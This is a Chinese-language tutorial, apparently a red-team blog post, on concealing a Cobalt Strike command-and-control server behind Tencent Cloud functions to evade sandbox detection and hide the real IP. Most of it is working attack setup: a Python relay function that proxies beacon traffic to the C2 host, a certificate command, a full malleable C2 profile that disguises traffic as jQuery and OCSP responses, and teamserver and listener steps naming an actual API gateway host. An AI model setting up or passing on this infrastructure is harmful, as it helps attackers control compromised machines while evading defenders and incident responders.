# C2服务器隐藏

木马丢进沙箱可动态监测木马反弹地址（C2服务器），使用C2隐藏技术可以有效防止暴露真实IP及安全设备的检测。

## 云函数

CS马被执行后，流量直接走向腾讯云的api，然后py函数会根据传入的流量作为中间人对CS服务端进行请求，并获取返回结果后返回请求获取的数据信息。

### 1、创建云函数

腾讯云函数服务-函数管理进行新建-从头开始

![image-20220526104033774](https://image.3001.net/images/20220527/1653631936_62906bc06b460923715f1.png!small)

![image-20220526104257959](https://image.3001.net/images/20220527/1653631937_62906bc1116164de3e0b3.png!small)

在脚本内填入c2服务器地址

    
    
    # -*- coding: utf8 -*-    import json,requests,base64
    def main_handler(event, context):
        C2='http://<C2服务器地址>' # 这里可以使用 HTTP、HTTPS~下角标~
        path=event['path']
        headers=event['headers']
        print(event)
        if event['httpMethod'] == 'GET' :
            resp=requests.get(C2+path,headers=headers,verify=False) 
        else:
            resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
            print(resp.headers)
            print(resp.content)
    
        response={
            "isBase64Encoded": True,
            "statusCode": resp.status_code,
            "headers": dict(resp.headers),
            "body": str(base64.b64encode(resp.content))[2:-1]
        }
        return response
    

### 2、新建触发器

函数服务-函数名-触发管理-创建触发器（修触发别名/版本：$LATEST、触发方式：API网关触发）

![image-20220526104632132](https://image.3001.net/images/20220527/1653631937_62906bc1c31588457f2c6.png!small)

进入函数api配置，更改路径为`/`，配置完发布api

### 3、配置CS profile

  * 使用keytools生成证书文件，记住证书密码，要在profile配置

    
    
    keytool -keystore CS.store -storepass PASSWORD -keypass PASSWORD -genkey -keyalg RSA -alias baidu.com -dname "CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN"
    

  * profile 模板

    
    
    set sample_name "fricky";
    
    set sleeptime "3000";
    set jitter    "0";
    set maxdns    "255";
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
    
    https-certificate 
    {
    
        set keystore "cobaltStrike.store"; //证书名
        set password "PASSWORD";    //密码
    
        ## Option 3) Cobalt Strike Self-Signed Certificate
        set C   "US";
        set CN  "jquery.com";
        set O   "jQuery";
        set OU  "Certificate Authority";
        set validity "365";
    }
    
    http-get 
    {
    
        set uri "/api/getit";
    
        client {
            header "Accept" "*/*";
            metadata {
                base64;
                prepend "SESSIONID=";
                header "Cookie";
            }
        }
    
        server {
            header "Content-Type" "application/ocsp-response";
            header "content-transfer-encoding" "binary";
            header "Server" "Nodejs";
            output {
                base64;
                print;
            }
        }
    }
    http-stager 
    {
        set uri_x86 "/vue.min.js";
        set uri_x64 "/bootstrap-2.min.js";
    }
    http-post {
        set uri "/api/postit";
        client {
            header "Accept" "*/*";
            id {
                base64;
                prepend "JSESSION=";
                header "Cookie";
            }
            output {
                base64;
                print;
            }
        }
    
        server 
        {
            header "Content-Type" "application/ocsp-response";
            header "content-transfer-encoding" "binary";
            header "Connection" "keep-alive";
            output {
                base64;
                print;
            }
        }
    }
    

  * 创建完成后，把证书和profile文件放入CS文件夹，使用`./teamserver IP PASSWORD c2.profile`加载profile启动cs

### 4、CS

  * 本地客户端连接，创建监听

这里只能创建80和443端口监听。

填入的HTTP Hosts、HTTP Hosts（stager）为`service-qri1tvhl-1304208638.bj.apigw.tencentcs.com`，去除`http://`和`PORT`

![image-20220526110341136](https://image.3001.net/images/20220527/1653631938_62906bc279ca242be2013.png!small)

  * 打开CS web日志，访问云函数地址，发现CS的日志出现流量，至此云函数配置成功

![image-20220526110646146](https://image.3001.net/images/20220527/1653631939_62906bc3349a391162524.png!small)

  * 上线

上线后可以发现外连地址一直在变化

![image-20220526110838012](https://image.3001.net/images/20220527/1653632374_62906d7659031221672e9.png!small)

